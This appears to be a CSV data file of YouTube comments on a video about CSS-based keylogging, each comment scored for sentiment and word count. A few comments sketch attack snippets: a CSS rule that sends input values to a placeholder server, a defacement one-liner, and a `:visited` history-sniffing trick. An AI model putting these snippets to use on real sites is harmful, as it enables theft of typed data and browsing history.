@@ -1,0 +1,201 @@
+,sentiment,wordCount
+"""It's your mind that twists not the spoon"" - Matrix 99",0.0,13
+"""almost every video""? Sounds like you had bad luck, but now you have seen all of them. The other videos are not like that at all. Maybe try out the CTF video write-up playlist!",0.6177,41
+#MUWA • Because CSS can download things like images and it   can also inject HTML.,0.3612,16
+".mario alias ""The handsome Heartbreaker"" 😄😄",0.0,10
+"1. How many skilled ""hacker"" already used this...
+2. How many other things out there that's not published :)
+
+These exploits worth tons of money while they're unpublished and kept secret",-0.4552,36
+"1. hackers still can find variable because its get display on screen unecrypted, check "" Backtracing Shared Instructions from Visual Addresses"" video
+
+2. many games don't do that because it causes lag and it not protects from esp and aimbots so no point to do that, its just adds lag to the game, e.g arma3 have client side shoot detection..
+
+3. you still get bad reveiws of the game if there a lot hackers :)
+
+i'm thinking to make anitdebug and code memory verification, so there will be no easy way to edit code or connect cheat engine to the game.",-0.9021,114
+<3 another great vedio,0.7906,4
+Additionally it shows a great POC using chrome extensions as CSS injector which is less common to vet compared to malicious JS injection,0.6249,23
+Agreed this isn't a keylogger.,0.2732,6
+Amazing! Never heard of CSS attacks.,0.2942,8
+An Enemy LMFAO true xD,0.8091,5
+"An easy anti cheat to make, is to take the variable, multiply it's value by a random number, and store that number alongside it, each time you read or write that value, you change the random number.
+it stops a lot of people from simply using cheat engine and modifying the variable.
+if you are communicating with an http server, do use Https and verify the certificate.
+also if you are making a single player/local coop game, *don't put an anti cheat in*, but do put an ""assist mode"" or a ""crazy mode"".
+
+if you are using a client-server model, don't trust the client and do the calculations on the server, this is more intensive, but you avoid most cheats.
+also, you can try to look for mods/cheats and put players that are cheating in the same matchmaking pool, most cheaters don't mind that.
+
+another way to look at it is to wonder how cheats can and would impact the game,  and put those in in a limited fashion, for example, if people may be looking to slow down or speed up the game, allow it in private lobbies with a 0.5-x4 speed, it might help people not want to cheat.
+
+finally, you can't make a 100% proof anti cheat, so the simplest option is to have players report cheaters, and look at the numbers of complaints a given player gets, then put him in a cheater queue if they get complaints too often.",-0.9952,286
+And I learned about it trough this video.,0.0,9
+"And deface with this 1 line :P
+*{animation:ha 1s infinite}@keyframes ha{from{transform:scale(2)}to{transform:rotate(360deg)}}",0.4084,37
+"And even if it was, the CSS would be computed and rendered on page load - when the input field is empty",-0.2023,23
+Awesome!,0.6588,2
+Basically any forum messageboard site that displays user content while the viewer is logging in is vulnerable.,-0.2263,18
+Berlinsides! I was making music there lol,0.4753,8
+Bist du deutsch???,0.0,6
+Browsers are aware of this and they consider it a privacy violation. Doesn't work in Chrome 64.,-0.4939,19
+But how is this relevant? wouldn't the effort of injecting a CSS code into a browser is the same as injecting JS codes?,0.0,25
+But the point of the video is that we didn’t just discover that :D it was known for many years ;),0.7125,23
+"CSS is a Turing complete language. you could rewrite metasploit in CSS, you could write a C comiler in CSS, you get the idea",0.0,27
+CSS keylogging isn’t new (2009 http://slideplayer.com/slide/3493669/) but the reason the github repo exploded is because it applies it to REACT apps.,0.0,26
+Couldn't you combine this with css variables and then capture the actual password?,0.0,14
+"Cross Site Styling ""Other XSS"" can get dangerous, but the main attack vector is that it can be abused to mask injected HTML to look like legit content of the website, and can carry out pretty effective phishing attacks.",-0.4215,44
+"Daniel Schmidt
+Yes, but you are the one using it, and you will also be the victim of an attack through that extention, so you have to be sure that the programmer behind the extension is not black hat, and if you download external CSS styles for that extention, you also have to be sure they are not containing things like this.
+You cannot really blame that on CSS, if it is the user who is careless.",-0.4742,85
+Danka leute. Thx guys,0.3612,5
+"Didn't know that it was already discovered, but I found this attack at the beginning good, but after 10 min of research it wasn't good than I understood, and so the title is for smth",0.4142,38
+"Didn’t even think to check for that, thanks a ton!",0.4926,14
+Er ist Österreicher.,0.0,4
+"GREAT Video, well explained and intresting moderation! Keep it goin' sir :D",0.9054,15
+Great as always.,0.6249,4
+"Great content as usual man, love your channel. Totally off-topic question, but what do you use for your pen/pencil/drawing overlay graphics when you make your videos?
+
+I have some video tutorials for a couple friends that involve a lot of math that would be much easier to write into than use some kind of equation formatter.",0.9186,65
+"Great idea! Rediscover old xss hacks, have everyone download your chrome plugin.
+Its not like you couldnt just put a keylogger in the plugin right?",0.5076,29
+"Great video bro, never heard of css attack!",0.3164,10
+Harold Oxlay XHTML and CSS Tutorials Playlist: https://www.youtube.com/playlist?list=PLC1322B5A0180C946,0.0,9
+Harold Oxlay learn css and check it again,0.0,8
+"Hay I'm not trying to troll. 
+Do you know anything about RUST? 
+I'm a code noob. could you do a video on Rust please.",0.2732,28
+"Hello, LiveOverflow! 
+I like your videos a lot, thank you!
+
+Just an idea.. maybe you could make a video about how to generally be safe on the internet? 
+Something a little bit more detailed than just ""look what sites you visit"" and ""dont open unknown binaries"" ?
+
+I have encountered so many situations where simply from visiting a website, even with the newest browser version, i suddenly had malware on my pc.",0.8336,85
+"Heywood Yabloome Correct. I am aware of this problem. But how many ""regular users"" are? 90% of the users probably don't even think about this when installing a custon style",-0.481,36
+His opinion,0.0,2
+How do you inject the malicious css though?,0.0,9
+I don’t understand how anyone could possibly exploit my web app with this?,-0.1027,16
+"I for example use a chrome plugin which allows you to have user created css for certain websites. Just create your own ""style"" that includes the keylogger",0.6369,30
+I fucking love this channel ! <3,0.8264,7
+"I fucking love this channel ! <3
+I fucking love this channel ! <3
+I fucking love this channel ! <3
+I fucking love this channel ! <3
+I fucking love this channel ! <3
+I fucking love this channel ! <3
+I fucking love this channel ! <3",0.9951,49
+"I had a very similar story that brought me to meet .mario, among other amazing people. In 2016, I published a slidedeck explaining how to encode JavaScript with only six characters, believing to be the first to think about that. This had its small success on the news sites and was published in JS Weekly. It turned out that Martin Kleppe had preceded me with his project JSFuck, and that this idea had already been studied in a book published in 2011 and written by ... Mario Heiderich, Eduardo Albert Vela Nava, Gareth Heyes and David Lindsay. It's a small world ! In the end, I was able to talk with them and join their working group to contribute. I think Mike Gualtieri made the same mistake as me, but if it helps to inform people while getting experts and apprentices to meet each other, then it's a good, innocent mistake.",0.8687,168
+"I had once been very interested in hacking/Cyber Security but never pursued the interest for lack of experience and the vastness of the field. However, now that I am graduating with a CSCI degree and have some experience in various programming languages this is a lot more feasible. The only reason that this was even brought to my attention was your incredibly informative videos. I am now considering a career path in the field and even a masters degree. This is all thanks to your hard work. I really appreciate what you do. Keep kickin ass!",-0.3129,106
+I have seen it loong time ago w/ using font ligatures so you are not abaddoned in this surprise :),0.657,21
+I spotted the guy who just learned js,0.0,8
+"I think to a typical user, losing their password privacy is actually a big deal, so if this can keylog a password, that's not a small problem.",-0.088,31
+"I though css is just for styling script for html, and this attack is really break my tough about css :v",-0.6585,23
+"I use JavaScript and HTML on simple sites, but I see why people would use react for complicated web applications",0.0,21
+I was just thinking you should make a video about this and... you didn't take long to do it!,0.0,21
+"I'm a new subscrito to your channel and I must say that I'm stunned by your videos. I'm not a hacker/programmer myself, but I'm really interested in that stuff and I want to learn ""it"" over the next years.
+My question to you would be ""How old were you when you started programming?"" and ""How many programming languages do you speak?"" and ""How long did it take to get this profound knowledge of things to work with?""
+The last question is kinda cheesy, because you never stop learning, but I mean, how long did it take to get all most of the necessary meta-knowledge that led to the first ""Aha!"" moments you had during hacking/reverse engineering?
+
+I'm a big fan of your work. Keep it up!
+Greets from a fellow German :D (Your accent is hard to miss^^)",0.9579,169
+"If this blew your mind. Did you actually know, that HTML5 and CSS3 together are turing complete? 
+Someone implemented Rule 110 with it 😵",0.0,29
+"If we just discovered how to make  key loggers in css,imagine how many things we have not discoverd.....",0.0,21
+Is (mutation)mXss still a thing,0.0,8
+"It doesn't even work unless your js is actively changing the value attribute on every input.
+Some other guy also reported that each character would only get registered once.",0.5719,31
+"It doesn't work as a keylogger. Just try it. Open jsFiddle, paste the code, look at the network connections. It just doesn't work.",0.0,29
+It is not per se as it is not autonomous,0.0,10
+"It is surely possible by doing that. I just recall that being something that came up in the past, since I distinctly remember being frustrated I couldn't get the colour of a link for some reason. It was probably some ugly hack I was trying to do years ago.",-0.5859,53
+"It's not relevant, if you use only external CSS and same origin politics in CSP header. The browser will not run inline CSS as it will not run inline JS either, if you set the right politics. You can check it in browser debugging window.
+This is relevant only if you do not know how to set the correct policies.",0.0,66
+"It's only a real threat if only a select few know about it, which is why you don't see the bad guys spreading it around. Promoting awareness helps the good guys test for, minimize, and in some cases even block these attacks.",0.1655,47
+Its NOT hack,0.0,3
+Keep it up dude! Great videos.,0.6588,8
+"Lee Roy I know, that was my original point. It's impossible to get the colour of a link in JS.",0.3182,23
+Nice english many likes from me.,0.6808,7
+Nice overview and breakdown.  And thank you for highlighting the earlier research.  :),0.8074,15
+"Not quite sure how this CSS keylogger would be advantegeous over an JS Keylogger.
+1. It's a lot more work, and a lot less reliable as you, for example, cant detect backspaces.
+2. It will generate A LOT more requests in a browser, thus making it a lot easier for console users to detect something fishy going on (Aside of the large amount of requests, just loading this huge list of CSS rules will impact the site loading performance as well, which surely also will be noticed.
+3. Are there really people who disable JavaScript? And if so, what percentage are we looking at, especially depending on the website, since most require JS to work if you dont want the website to lose most of its functionality.",0.8441,145
+"One could argue that hosting CSS files on a ""untrusted"" CDN is not a big deal, compared to hosting JS on a untrusted CDN.  If one hijacks the CDN, they could implement this, no?",-0.5994,41
+Or just use JavaScript?,0.0,5
+Proof?,0.0,2
+Same way you get malicious JS or HTML somewhere. With some kind of injection or so.,0.0,18
+Second! Sick video. Have never heard about it tho,-0.5562,11
+Security by obscurity. The best kind of security ;),0.872,10
+Setting the background of a an input selector isn't keylogging btw,0.0,11
+Sir please make video on section overflow.,0.3182,8
+So handsome,0.5413,2
+"Sorry, I was replying to the CSS guy, wasn't paying attention...",-0.0772,14
+Stephen Lynx watch the video properly reeee,0.0,7
+Stop using fancy frameworks and write JavaScript from scratch in Emacs. This is what I do.,-0.296,18
+SwordQuake2 They teach how how to make bombs in chemistry my dude,0.0,13
+SwordQuake2 then you've never studied economics,0.0,7
+"TOMYSSHADOW Need a separate class for each competitor, but you get the idea.",0.0,15
+TOMYSSHADOW No problem. Just do it in css. A.competitor.visited{background url...,-0.5994,15
+Tatu Saalasti i mean he was probably caught up with his thought process and didnt wanna lose his train of thought,0.3089,21
+Teachers don't tell you how to steal people's information,-0.4939,9
+"That reminds me a lot about how they made it so in JS you can't detect the colour of a link, since websites could put hidden links to their competitors and check if they were purple in order to see if the user visited their competitor's site...",0.0,49
+"This applies to me too i think there are some chrome vulnerabilities in changing startup site, search engine, etc.. definitly didn't download a thing",-0.1531,27
+"This can be used to deanonymize users of tor. It also is why you should use the tell browser and why it tells you not to change the browser windows dimensions.
+I'm not sure why you are saying it  can't as it definitely can. Maybe you are misunderstanding what they mean about Deanonymization in this context is just being able to distinguish two users from each other in a somewhat persistent way.",-0.7202,76
+Turing completeness is not sufficient to implement metasploit. Turning completeness does not imply side effects. Metasploit needs specific side effects.,0.0,23
+UnboxModz learn css in this video?,0.0,7
+"Very old, its funny 😄 if you don't know About it HHH",0.4877,13
+VoidMoth you made the claim but ok (no need to be rude),0.4215,14
+Weird that the re-research guy didn't simply Google- search for CSS- keylogger programs before starting his little project.,-0.1779,21
+What you describe sounds like year 2005 or so. This shouldn’t happen anymore today ;),0.5267,18
+When this video came up i first seen CSS and thought it was Counter Strike Source.... Then i saw it was your channel and i felt like a idiot... hahahahah,0.25,32
+"Why don't they do it like this:
+
+input {
+  background: url(""http://myserver.com/"" attr(value)) // Add the thing to combine these here :)
+}",0.6705,33
+Why?,0.0,2
+"Wouldn't the keylogger make no sense, since it's counting that some JS will sync the `value` property. Why not use JS instead?",-0.296,27
+"Yeah yeah, jQuery is fantastic, isn't it? :P
+
+I know that all the devs these days are dwelling in their dependencies, but that doesn't mean that your counter app needs to have 50kb in libraries when you can just make that with the DOM API.
+
+Libraries like React and Vue are great at reducing developing time and cost, but that doesn't mean that they need to be in every website",0.9154,76
+"Yeah, ""awesome"". GJ spreading threats around",0.4824,10
+"Yeah, aweseome! You would arrest teachers for teaching wouldn't you? Knowledge can always be used for the good and bad.",-0.2714,24
+You Sir are wise :) thanks for reminding this,0.8402,9
+You can find a making off video on my channel ;),0.2263,11
+You can't do that without js,0.0,6
+You compared that to the discovery of a planet in the habitable zone? Com'mon... -.-,0.0,19
+"You know... I'm entirely new to the topic... and I really don't know anything about what this channel is all about, so.... where do I start? ^^ Any suggestions as to where I can start learning about programming and hacking overall? :3",0.5661,50
+"You should do my schools ctf. its at ctf.tamu.edu
+
+Even though the competition ends today I believe the challenges will still be up. It would be very interesting to see your take on them.",0.5095,37
+Your voice sounds like Codeinstein,0.3612,5
+Zioshi yes,0.4019,2
+ash boon I mean is it really someone would have to have access to the HTML on the server or some way of injecting it to all of the clients.,0.0,31
+attr() isn't supported outside of the content property,-0.2411,10
+because you wouldn't need megabytes of css to log the input,0.0,11
+bist du deutscher,0.0,3
+creative is hack born to dare,0.4404,6
+css Lulzzz.css,0.0,2
+fake,-0.4767,1
+finally something I can understand...,0.0,6
+first!,0.0,2
+"glaub nicht, dass er österreicher ist. er studiert & arbeitet in berlin...",0.0,15
+"good channel but in almoust every video half of time is spent to judging other people behaviour, useless information and very annoying..",-0.4118,24
+his train of thought was still boarding at the station.  lmao,0.5994,12
+"i dont understand anything about computer science, but there is something enjoyable watching your videos lol",0.8201,17
+i watching this video and i dont understand all about it 😓😖,0.0,13
+"if i recall correctly, firefox discards most css properties/values for :visited, so that shouldn't(?) work",-0.25,23
+"in that case the thing is that images can come from different servers without causing trouble with the Cross Origin Resource Security, you wouldn't be able to send the data across to your server using javascript directly ...",0.5659,39
+lol,0.4215,1
+no problem ;),-0.4588,3
+"off topic, but its good practice to try to pronounce every word you can't pronounce straight away or look it up so you can improve your english. loved the video, very nice quality.",0.9558,37
+"sorry, i should say almoust every video i watched, rubber duck for example, but great channel keep it up! i'm trying to learn how to make anticheat for my games :)",0.8955,35
+thats actually quite cool,0.3804,4
+"the moment selecting stuff via n letter becomes possible, is the moment a ton of sites will have keyloggers appear out of thin air",0.0,25
+what is?,0.0,3
+"yeah, I said in the video that it's more of a ""thought experiment"", because it's really rare",0.296,21
+youre a big boy now so I guess you can use these new things called internet search engines you should try them,0.0,22
+"Не понятно, че делать то с этим. Как загружать жертве, только через плугин браузера?",0.0,18
